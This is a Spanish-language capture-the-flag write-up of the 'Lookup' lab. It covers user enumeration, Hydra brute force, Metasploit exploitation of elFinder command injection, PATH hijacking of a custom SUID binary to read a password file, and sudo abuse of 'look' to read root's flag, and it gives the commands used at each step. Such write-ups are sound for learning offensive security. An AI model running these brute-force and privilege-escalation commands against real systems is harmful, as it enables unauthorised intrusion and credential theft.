# Lookup

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux mediante la explotación de una aplicación web vulnerable, obteniendo acceso inicial a través de **elFinder**, recuperando credenciales mediante el abuso de un binario **SUID** personalizado y escalando privilegios aprovechando permisos inseguros de **sudo** sobre el binario `look`.

---

## 🛠️ Tecnologías trabajadas

- AutoNmap
- Incursore
- Hydra
- elFinder
- Metasploit
- Meterpreter
- Command Injection
- SSH
- SUID
- PATH Hijacking
- GTFOBins
- `look`

---

## 🧠 Metodología

La enumeración inicial reveló únicamente dos servicios expuestos: **SSH** y una aplicación web. Al no existir otros vectores evidentes de ataque, toda la investigación se centró en la aplicación web.

Durante las pruebas manuales identifiqué una vulnerabilidad de **enumeración de usuarios**, que permitió descubrir un usuario válido. Tras obtener sus credenciales mediante un ataque de fuerza bruta con **Hydra**, accedí a un gestor de archivos basado en **elFinder**, vulnerable a una **Command Injection** conocida.

La explotación de esta vulnerabilidad proporcionó acceso inicial al sistema mediante **Meterpreter**. A continuación, la enumeración local permitió identificar un binario **SUID** personalizado que podía ser manipulado mediante **PATH Hijacking** para revelar credenciales almacenadas en un archivo protegido.

Finalmente, utilizando dichas credenciales accedí al sistema mediante **SSH** y aproveché un permiso de **sudo** sobre el binario `look` para leer directamente el contenido del archivo `root.txt`, completando la escalada de privilegios.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé realizando un reconocimiento con **AutoNmap** e **Incursore**.

Los servicios detectados fueron:

| Puerto | Servicio |
|---------|----------|
| 22 | SSH |
| 80 | HTTP |

Al tratarse de una máquina con una superficie de ataque muy reducida, el análisis se centró completamente en la aplicación web.

---

### 2. Enumeración web

Accedí al servicio HTTP.

```text
http://lookup.thm
```

La aplicación mostraba un formulario de autenticación con los campos de usuario y contraseña.

Durante las pruebas manuales observé un comportamiento diferente según el nombre de usuario introducido.

Para el usuario:

```text
admin
```

la aplicación respondía:

```text
Wrong password
```

Mientras que para usuarios inexistentes devolvía:

```text
Wrong username/password
```

Esta diferencia permitía realizar una **enumeración de usuarios válidos**.

Utilizando el script proporcionado por el laboratorio obtuve el siguiente usuario:

```text
jose
```

---

### 3. Obtención de credenciales

Con el usuario identificado lancé un ataque de fuerza bruta utilizando **Hydra**.

```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password. Please try again." -V
```

Resultado:

```text
jose:password123
```

Con estas credenciales obtuve acceso a la aplicación.

---

### 4. Acceso inicial

Tras iniciar sesión la aplicación redirigía automáticamente al subdominio:

```text
file.lookup.thm
```

Añadí el dominio al archivo:

```text
/etc/hosts
```

Una vez actualizado pude acceder correctamente al gestor de archivos.

Durante la enumeración identifiqué la aplicación utilizada.

```text
elFinder 2.1.47
```

Busqué vulnerabilidades públicas.

```bash
searchsploit elFinder
```

Encontré una vulnerabilidad de:

```text
Command Injection
```

---

### 5. Explotación de elFinder

Inicié **Metasploit**.

```bash
msfconsole
```

Busqué el módulo correspondiente.

```bash
search elfinder
```

Tras configurar el exploit con los parámetros adecuados ejecuté el módulo.

Como resultado obtuve una sesión de **Meterpreter**.

Desde Meterpreter abrí una shell interactiva.

```text
shell
```

Con ello conseguí el acceso inicial al sistema.

---

### 6. Enumeración local

Durante la enumeración observé la existencia del usuario:

```text
think
```

Enumeré todos los usuarios con una shell válida.

```bash
cat /etc/passwd | grep sh$
```

Resultado:

- think
- root

También descubrí un archivo protegido.

```text
.passwords
```

Sin embargo, el usuario comprometido no tenía permisos para leerlo directamente.

---

### 7. Obtención de credenciales mediante un binario SUID

Busqué binarios SUID presentes en el sistema.

```bash
find / -perm /4000 2>/dev/null
```

Entre ellos apareció un ejecutable poco habitual.

```text
/usr/sbin/pwm
```

Al tratarse de un binario personalizado analicé su funcionamiento.

```bash
strings /usr/sbin/pwm
```

Observé que utilizaba el comando `id` sin especificar una ruta absoluta, lo que permitía realizar un **PATH Hijacking**.

Me situé en:

```bash
cd /tmp
```

Creé un ejecutable que suplantaba el comportamiento del comando `id`.

```bash
echo 'echo "uid=1000(think)"' > id
chmod +x id
```

Después modifiqué la variable `PATH`.

```bash
export PATH=/tmp:$PATH
```

Finalmente ejecuté el binario vulnerable.

```bash
pwm
```

Como resultado obtuve el contenido del archivo:

```text
.passwords
```

Recuperando así varias credenciales del sistema.

---

### 8. Acceso mediante SSH

Guardé las contraseñas recuperadas y lancé un ataque de fuerza bruta contra el servicio SSH.

```bash
hydra -l think -P Passwords ssh://lookup.thm
```

Resultado:

```text
think:josemario.AKA(think)
```

Con estas credenciales inicié sesión.

```bash
ssh think@lookup.thm
```

Una vez autenticado recuperé la flag de usuario.

```bash
cat user.txt
```

---

### 9. Escalada de privilegios

Comprobé los permisos disponibles mediante `sudo`.

```bash
sudo -l
```

El resultado mostraba que el usuario podía ejecutar el siguiente binario como **root**.

```text
/usr/bin/look
```

Tras revisar su funcionamiento comprobé que podía utilizarse para leer archivos arbitrarios cuando era ejecutado con privilegios elevados.

Ejecuté:

```bash
sudo /usr/bin/look '' /root/root.txt
```

El comando devolvió directamente el contenido del archivo:

Con ello completé la escalada de privilegios.

---

## 📚 Lecciones aprendidas

- Este laboratorio permitió recorrer una cadena de explotación muy completa, combinando vulnerabilidades web, obtención de credenciales, abuso de binarios SUID y escalada mediante permisos inseguros de **sudo**.
- Detectar vulnerabilidades de **User Enumeration** en formularios de autenticación.
- Realizar ataques de fuerza bruta sobre aplicaciones web utilizando **Hydra**.
- Identificar instalaciones vulnerables de **elFinder**.
- Explotar una vulnerabilidad de **Command Injection** mediante **Metasploit**.
- Realizar enumeración local desde una sesión **Meterpreter**.
- Identificar binarios **SUID** personalizados.
- Explotar un **PATH Hijacking** cuando un binario invoca comandos sin rutas absolutas.
- Recuperar credenciales almacenadas en archivos protegidos.
- Reutilizar credenciales para acceder mediante **SSH**.
- Aprovechar permisos inseguros de **sudo** sobre el binario `look` para leer archivos privilegiados.
